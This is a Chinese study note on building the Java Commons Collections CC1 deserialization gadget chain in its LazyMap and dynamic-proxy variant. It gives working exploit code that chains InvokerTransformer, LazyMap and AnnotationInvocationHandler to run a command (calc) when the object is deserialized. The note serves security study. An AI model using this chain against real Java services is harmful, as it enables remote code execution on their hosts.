[[java代码审计cc1链TransformedMap版本]]
参考文章
https://drun1baby.top/2022/06/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8702-CC1%E9%93%BE%E8%A1%A5%E5%85%85/
前面依旧是通过调用InvokeTransform类的transform方法命令执行
```java

package org.example;  
  
import org.apache.commons.collections.functors.InvokerTransformer;  
  
import java.io.IOException;  
import java.util.HashMap;  
import java.util.Map;  
  
public class CC1 {  
    public static void main(String[] args) throws IOException {  
        Runtime r = Runtime.getRuntime();  
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
        invokerTransformer.transform(r);  
    }  
}
```
但通过查看transformer方法调用情况可以发现另一个调用链LazpMap
```java
public class LazyMap  
        extends AbstractMapDecorator  
        implements Map, Serializable {  
  
    /** Serialization version */  
    private static final long serialVersionUID = 7990956402564206740L;  
  
    /** The factory to use to construct elements */   
    /**  
     * Factory method to create a lazily instantiated map.     ** @param map  the map to decorate, must not be null  
     * @param factory  the factory to use, must not be null  
     * @throws IllegalArgumentException if map or factory is null  
     */   
      public static Map decorate(Map map, Transformer factory) {  
        return new LazyMap(map, factory);  
    }
protected LazyMap(Map map, Factory factory) {  
    super(map);  
    if (factory == null) {  
        throw new IllegalArgumentException("Factory must not be null");  
    }  
    this.factory = FactoryTransformer.getInstance(factory);  
}

public Object get(Object key) {  
    // create value for key if key is not currently in the map  
    if (map.containsKey(key) == false) {  
        Object value = factory.transform(key);  
        map.put(key, value);  
        return value;  
    }  
    return map.get(key);  
}
```
可以发现这个类的get方法调用了transform方法并且调用的变量factory也是transform类型
同样发现虽然构造方法不能直接调用，但是可以通过LazyMap类的decorate方法去间接实例化LazyMap对象
然后在反射调用其get方法
exp
```java
public static void main(String[] args) throws Exception {  
    Runtime r = Runtime.getRuntime();  
    InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
    Map<String, String> map = new HashMap();  
    Map expMap = LazyMap.decorate(map, invokerTransformer);  
    Class<LazyMap> lazyMapClass = LazyMap.class;  
    Method lazyMapGet = lazyMapClass.getDeclaredMethod("get", Object.class);  
    lazyMapGet.setAccessible(true);  
    lazyMapGet.invoke(expMap, r);  
}
```
![[Pasted image 20250601161059.png]]

这时就可以去查找get方法的调用处

发现在AnnotationInvocationHandler中
```java
public Object invoke(Object proxy, Method method, Object[] args) {  
    String member = method.getName();  
    Class<?>[] paramTypes = method.getParameterTypes();  
  
    // Handle Object and Annotation methods  
    if (member.equals("equals") && paramTypes.length == 1 &&  
        paramTypes[0] == Object.class)  
        return equalsImpl(args[0]);  
    if (paramTypes.length != 0)  
        throw new AssertionError("Too many parameters for an annotation method");  
  
    switch(member) {  
    case "toString":  
        return toStringImpl();  
    case "hashCode":  
        return hashCodeImpl();  
    case "annotationType":  
        return type;  
    }  
  
    // Handle annotation member accessors  
    Object result = memberValues.get(member);  
  
    if (result == null)  
        throw new IncompleteAnnotationException(type, member);  
  
    if (result instanceof ExceptionProxy)  
        throw ((ExceptionProxy) result).generateException();  
  
    if (result.getClass().isArray() && Array.getLength(result) != 0)  
        result = cloneArray(result);  
  
    return result;  
}
```
这里已经调用了get方法 Object result = memberValues.get(member); 而这里的参数member刚好是传入invoke的参数并且也是最终调用的transformer方法的参数，因此参数可控。
而现在的问题在于如何调用invoke方法。
这里引入动态代理的特性，当一个对象被动态代理后，想要通过动态代理调用这个对象的方法，就一定·会调用invoke方法
这里参考了这篇文章描述动态代理的知识
https://drun1baby.top/2022/06/01/Java反序列化基础篇-04-JDK动态代理/

而这里我们可以对readObject方法中的memberValues对象进行动态代理，因为这样可以通过动态代理调用其的entrySet()方法从而导致invoke方法被调用，形成闭环
exp
```java
public static void main(String[] args) throws Exception {  
    Transformer[] transformers = new Transformer[]{  
            new ConstantTransformer(Runtime.class),  
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})  
    };  
  
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
    Map<Object, Object> expMap = new HashMap<>();  
    Map lazyMap = LazyMap.decorate(expMap, chainedTransformer);  
  
  
    Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
    Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);  
    constructor.setAccessible(true);  
    InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Override.class,  lazyMap);  
    Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, invocationHandler);  
    invocationHandler = (InvocationHandler) constructor.newInstance(Override.class, proxyMap);  
    serialize(invocationHandler);  
    unserialize();  
}  
public  static void serialize(Object obj) throws IOException {  
    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
    oos.writeObject(obj);  
  
}  
public static Object unserialize() throws IOException, ClassNotFoundException {  
    ObjectInputStream ois = new ObjectInputStream(new FileInputStream("ser.bin"));  
    Object obj = ois.readObject();  
    return obj;  
}
```
![[Pasted image 20250602230329.png]]

其实和TransformedMap版本的很多点相似，例如通过结合ContstantTransform和ChainedTransformer实现控制参数，但是这里巧妙之处更在于通过动态代理去间接调用invoke方法从而达到效果。